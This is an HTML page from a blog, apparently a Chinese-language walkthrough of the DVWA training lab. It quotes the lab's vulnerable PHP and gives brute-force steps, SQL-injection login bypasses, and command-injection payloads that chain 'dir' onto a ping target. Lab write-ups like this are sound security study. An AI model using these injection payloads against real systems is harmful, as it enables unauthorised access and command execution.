@@ -1,0 +1,820 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>DVWA练习 | Hexo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="John Doe">
+    
+
+    
+    <meta name="description" content="前言一个小型靶场。 Brute ForceDVWA Security：low这题的名字是爆破，那我们就爆破一下试试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA练习">
+<meta property="og:url" content="http://example.com/2019/10/03/%E9%9D%B6%E5%9C%BA/DVWA%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言一个小型靶场。 Brute ForceDVWA Security：low这题的名字是爆破，那我们就爆破一下试试">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/03/uwBjbR.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/03/uwDEqA.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/03/uwDQxg.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/03/uwDBM4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/03/uwD5sH.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/03/uwLjpT.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/04/uD1XG9.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/04/uDtdPS.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/04/uD0HZd.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/04/urieIK.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/04/urFiY8.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/08/uffNOf.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/08/ufTvAf.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/08/uf7AH0.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/08/uf7L24.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/08/ufHIQH.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/08/ufHgdx.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/08/uhnmmd.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/08/uhnJXQ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/08/uhuXqJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/08/uh8RfA.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/08/uhGitJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/10/08/uhN4Z6.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KXaYnO.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KXdA5d.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KXd9KK.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KX0dN4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KX0RED.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KXrcD0.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KjlJN6.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KjlsEt.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/03/KjJQTs.png">
+<meta property="article:published_time" content="2019-10-03T01:29:16.000Z">
+<meta property="article:modified_time" content="2019-11-03T14:05:09.797Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="DVWA">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/10/03/uwBjbR.png">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/tou1.png">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    
+<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/%02.css">
+<link rel="stylesheet" href="/.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.jpg" alt="Hexo" title="Hexo"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Hexo">Hexo</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:example.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2019/10/03/靶场/DVWA练习/" title="DVWA练习" itemprop="url">DVWA练习</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="John Doe" target="_blank" itemprop="author">John Doe</a>
+		
+  <p class="article-time">
+    <time datetime="2019-10-03T01:29:16.000Z" itemprop="datePublished"> Published 2019-10-03</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brute-Force"><span class="toc-number">2.</span> <span class="toc-text">Brute Force</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security%EF%BC%9Alow"><span class="toc-number">2.1.</span> <span class="toc-text">DVWA Security：low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security%EF%BC%9Amedium"><span class="toc-number">2.2.</span> <span class="toc-text">DVWA Security：medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security%EF%BC%9Ahigh"><span class="toc-number">2.3.</span> <span class="toc-text">DVWA Security：high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Command-Injection"><span class="toc-number">3.</span> <span class="toc-text">Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security%EF%BC%9Alow-1"><span class="toc-number">3.1.</span> <span class="toc-text">DVWA Security：low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security%EF%BC%9Amedium-1"><span class="toc-number">3.2.</span> <span class="toc-text">DVWA Security：medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security%EF%BC%9Ahigh-1"><span class="toc-number">3.3.</span> <span class="toc-text">DVWA Security：high</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-Security%EF%BC%9Aimpossible"><span class="toc-number">3.4.</span> <span class="toc-text">DVWA Security：impossible</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-Cross-site-request-forgery"><span class="toc-number">4.</span> <span class="toc-text">CSRF(Cross-site request forgery)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-security-low"><span class="toc-number">4.1.</span> <span class="toc-text">DVWA security:low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-security%EF%BC%9Amedium"><span class="toc-number">4.2.</span> <span class="toc-text">DVWA security：medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DVWA-security%EF%BC%9Ahigh"><span class="toc-number">4.3.</span> <span class="toc-text">DVWA security：high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Inclusion"><span class="toc-number">5.</span> <span class="toc-text">File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#low"><span class="toc-number">5.1.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#medium"><span class="toc-number">5.2.</span> <span class="toc-text">medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high"><span class="toc-number">5.3.</span> <span class="toc-text">high</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-upload"><span class="toc-number">6.</span> <span class="toc-text">file upload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#low-1"><span class="toc-number">6.1.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#medium-1"><span class="toc-number">6.2.</span> <span class="toc-text">medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#high-1"><span class="toc-number">6.3.</span> <span class="toc-text">high</span></a></li></ol></li></ol>
+		
+		</div>
+		
+		<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一个小型靶场。</p>
+<h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><h4 id="DVWA-Security：low"><a href="#DVWA-Security：low" class="headerlink" title="DVWA Security：low"></a>DVWA Security：low</h4><p>这题的名字是爆破，那我们就爆破一下试试<span id="more"></span></p>
+<p>先随便提交一个密码和用户名，打开代理，bp抓包</p>
+<p><img src="https://s2.ax1x.com/2019/10/03/uwBjbR.png" alt="uwBjbR.png"></p>
+<p>然后，发送到Intruder模块，进行如下设置</p>
+<p><img src="https://s2.ax1x.com/2019/10/03/uwDEqA.png" alt="uwDEqA.png"></p>
+<p>然后载入字典</p>
+<p><img src="https://s2.ax1x.com/2019/10/03/uwDQxg.png" alt="uwDQxg.png"></p>
+<p><img src="https://s2.ax1x.com/2019/10/03/uwDBM4.png" alt="uwDBM4.png"></p>
+<p>然后start attack，在结果中找到长度特殊的就是正确的用户名和密码</p>
+<p><img src="https://s2.ax1x.com/2019/10/03/uwD5sH.png" alt="uwD5sH.png"></p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123;</span><br><span class="line">	// Get username</span><br><span class="line">	$user = $_GET[ &#x27;username&#x27; ];</span><br><span class="line">	// Get password</span><br><span class="line">	$pass = $_GET[ &#x27;password&#x27; ];</span><br><span class="line">	$pass = md5( $pass );</span><br><span class="line">	// Check the database</span><br><span class="line">	$query  = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line">	if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;</span><br><span class="line">		// Get users details</span><br><span class="line">		$row    = mysqli_fetch_assoc( $result );</span><br><span class="line">		$avatar = $row[&quot;avatar&quot;];</span><br><span class="line">		// Login successful</span><br><span class="line">		$html .= &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;</span><br><span class="line">		$html .= &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		// Login failed</span><br><span class="line">		$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出来没有对username和password进行任何过滤，这里存在SQL注入漏洞。</p>
+<p><code>username=admin&#39; or &#39;1&#39;=&#39;1</code>或者<code>username=admin&#39;#</code>，即可成功登入</p>
+<p><img src="https://s2.ax1x.com/2019/10/03/uwLjpT.png" alt="uwLjpT.png"></p>
+<h4 id="DVWA-Security：medium"><a href="#DVWA-Security：medium" class="headerlink" title="DVWA Security：medium"></a>DVWA Security：medium</h4><p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123;</span><br><span class="line">	// Sanitise username input</span><br><span class="line">	$user = $_GET[ &#x27;username&#x27; ];</span><br><span class="line">	$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">	// Sanitise password input</span><br><span class="line">	$pass = $_GET[ &#x27;password&#x27; ];</span><br><span class="line">	$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">	$pass = md5( $pass );</span><br><span class="line">	// Check the database</span><br><span class="line">	$query  = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line">	if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;</span><br><span class="line">		// Get users details</span><br><span class="line">		$row    = mysqli_fetch_assoc( $result );</span><br><span class="line">		$avatar = $row[&quot;avatar&quot;];</span><br><span class="line">		// Login successful</span><br><span class="line">		$html .= &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;</span><br><span class="line">		$html .= &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		// Login failed</span><br><span class="line">		sleep( 2 );</span><br><span class="line">		$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>查看源码即可发现，这段代码里面添加了一个mysqli_real_escape_string()函数，这个函数主要对一些特殊字符作出了过滤，具体查看<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.mysql-real-escape-string.php">mysql_real_escape_string()</a></p>
+<blockquote>
+<p> 本函数将 unescaped_string 中的特殊字符转义，并计及连接的当前字符集，因此可以安全用于 mysql_query()。</p>
+<p>mysql_real_escape_string() 调用mysql库的函数 mysql_real_escape_string, 在以下字符前添加反斜杠: \x00, \n, \r, , ‘, “ 和 \x1a. </p>
+</blockquote>
+<p>这个函数能抵挡大部分的SQL注入，但是也有<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Safe3/archive/2008/08/22/1274095.html">缺陷</a>，可以看看。</p>
+<p>虽然无法SQL注入，但还是可以进行爆破，只是有个sleep()函数延时，步骤就像low一样，即可登入。</p>
+<h4 id="DVWA-Security：high"><a href="#DVWA-Security：high" class="headerlink" title="DVWA Security：high"></a>DVWA Security：high</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123;</span><br><span class="line">	// Check Anti-CSRF token</span><br><span class="line">	checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line">	// Sanitise username input</span><br><span class="line">	$user = $_GET[ &#x27;username&#x27; ];</span><br><span class="line">	$user = stripslashes( $user );</span><br><span class="line">	$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">	// Sanitise password input</span><br><span class="line">	$pass = $_GET[ &#x27;password&#x27; ];</span><br><span class="line">	$pass = stripslashes( $pass );</span><br><span class="line">	$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">	$pass = md5( $pass );</span><br><span class="line">	// Check database</span><br><span class="line">	$query  = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line">	if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;</span><br><span class="line">		// Get users details</span><br><span class="line">		$row    = mysqli_fetch_assoc( $result );</span><br><span class="line">		$avatar = $row[&quot;avatar&quot;];</span><br><span class="line"></span><br><span class="line">		// Login successful</span><br><span class="line">		$html .= &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;</span><br><span class="line">		$html .= &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		// Login failed</span><br><span class="line">		sleep( rand( 0, 3 ) );</span><br><span class="line">		$html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>high 的代码中又添加了一个函数 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.stripslashes.php">stripslashes()</a>，来去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个.</p>
+<p>还有mysqli_real_escape_string()函数过滤一些特殊字符，防止SQL注入。</p>
+<p>此外，这代码中还添加了token，每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。</p>
+<p>impossible级别的代码中，加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/116437.html">参考文章</a></p>
+<h3 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h3><p>即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。</p>
+<h4 id="DVWA-Security：low-1"><a href="#DVWA-Security：low-1" class="headerlink" title="DVWA Security：low"></a>DVWA Security：low</h4><p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	<span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"><span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line"><span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">	<span class="comment">// Windows</span></span><br><span class="line">	<span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">// *nix</span></span><br><span class="line">	<span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Feedback for the end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这段代码中，主要是两个函数</p>
+<blockquote>
+<p>stristr(string,search,before_search)</p>
+<p>stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为“false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。</p>
+<p>php_uname(mode)</p>
+<p>这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。</p>
+</blockquote>
+<p><strong>漏洞利用</strong></p>
+<p>window和linux系统都可以用&amp;&amp;来执行多条命令</p>
+<p>payload：<code>127.0.0.1&amp;&amp;dir</code></p>
+<p><img src="https://s2.ax1x.com/2019/10/04/uD1XG9.png" alt="uD1XG9.png"></p>
+<h4 id="DVWA-Security：medium-1"><a href="#DVWA-Security：medium-1" class="headerlink" title="DVWA Security：medium"></a>DVWA Security：medium</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	<span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">	<span class="comment">// Set blacklist</span></span><br><span class="line">	<span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">	);</span><br><span class="line">	<span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">	<span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line">	<span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">	<span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// Windows</span></span><br><span class="line">		<span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// *nix</span></span><br><span class="line">		<span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Feedback for the end user</span></span><br><span class="line">	<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>medium级别的代码中，用一个数组替换了**&amp;&amp;<strong>和</strong>;<strong>，但是并没有过滤掉</strong>&amp;**，也可以这样写<code>127.0.0.1&amp;;&amp;dir</code>，再或者使用<code>127.0.0.1|dir</code></p>
+<p>payload：<code>127.0.0.1&amp;dir</code>或者<code>127.0.0.1&amp;;&amp;dir</code></p>
+<p><img src="https://s2.ax1x.com/2019/10/04/uDtdPS.png" alt="uDtdPS.png"></p>
+<p><strong>“&amp;&amp;”和“&amp;”的区别：</strong></p>
+<blockquote>
+<p>ping 127.0.0.1&amp;&amp;dir</p>
+<p>先执行ping 127.0.0.1，执行成功，再执行dir，否则不执行dir</p>
+<p>ping 127.0.0.1&amp;dir</p>
+<p>无论ping 127.0.0.1是否执行成功，都会执行dir</p>
+</blockquote>
